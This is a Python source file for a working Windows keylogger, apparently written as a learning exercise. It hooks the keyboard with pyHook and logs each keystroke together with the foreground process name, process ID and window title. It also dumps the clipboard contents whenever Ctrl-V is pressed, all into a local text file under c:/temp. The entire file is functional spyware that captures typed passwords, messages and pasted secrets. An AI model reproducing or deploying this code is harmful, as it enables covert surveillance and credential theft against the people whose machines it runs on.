import getopt
import os
import sys
from argparse import ArgumentParser
from ctypes import *
from pathlib import Path

import pythoncom
import pyHook
import win32clipboard
import logging

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

# log file name - directory has to exist, could make it create as necessary
file_log_folder = 'c:/temp'
file_name = 'keylog2.txt'

def get_current_process():
    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process id
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process id
    process_id = pid.value

    # grab the executable
    executable = create_string_buffer(512)  # 0x00 == NULL
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # read the title
    window_title = create_string_buffer(512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # log out the header if we're in the right process
    logging.log(logging.DEBUG, "[PID: {0} - {1} - {2}".format(process_id, executable.value, window_title.value))

    # close the handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def key_stroke(event):
    global current_window

    # check if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName

    get_current_process()

    # if a standard key is pressed
    if event.Ascii in range(32, 128):
        logging.log(logging.DEBUG, chr(event.Ascii))
    else:
        # if [Ctrl-V] was pressed
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            logging.log(logging.DEBUG, "[PASTE] - {0}".format(pasted_value))
        else:
            logging.log(logging.DEBUG, "{0}".format(event.Key))

    # pass execution to the next registered hook
    return True

# check if directory filename passed in command line, this can be handled better
# with explicit args e.g -d <directory> -f <filename>
if len(sys.argv) == 2:
    file_name = sys.argv[1:][0]
elif len(sys.argv) == 3:
    file_log_folder = sys.argv[1:][0]
    file_name = sys.argv[2:][0]

# create file path if necessary
if not Path(file_log_folder).exists():
    try:
        os.mkdir(file_log_folder)
        print("Successfully created the directory %s ..." % file_log_folder)
    except OSError:
        print("Creation of the directory %s failed ..." % file_log_folder)
else:
    print("Directory already exists %s skipping create..." % file_log_folder)

file_log = file_log_folder + '/' + file_name

print("Keystore file is %s " % Path(file_log).absolute())

# setup some basics for the logging
logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')

# create and register a hook manager
kl = pyHook.HookManager()
kl.KeyDown = key_stroke

# register and loop hook
kl.HookKeyboard()
pythoncom.PumpMessages()  # get a Windows message pump
